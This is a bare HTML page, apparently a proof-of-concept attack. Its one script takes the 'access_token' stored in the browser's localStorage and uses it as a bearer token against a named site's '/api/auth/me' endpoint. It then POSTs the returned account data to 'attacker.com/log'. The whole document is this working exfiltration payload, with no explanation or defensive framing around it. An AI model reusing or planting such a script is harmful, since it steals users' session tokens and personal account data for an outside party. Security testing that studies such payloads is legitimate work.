<!DOCTYPE html>
<html>
<body>
<script>
fetch("https://chotcg.com/api/auth/me", {
  headers: {
    "Authorization": "Bearer " + localStorage.getItem("access_token")
  }
})
.then(res => res.text())
.then(data => {
  fetch("https://attacker.com/log", {
    method: "POST",
    body: data
  });
});
</script>
</body>
</html>
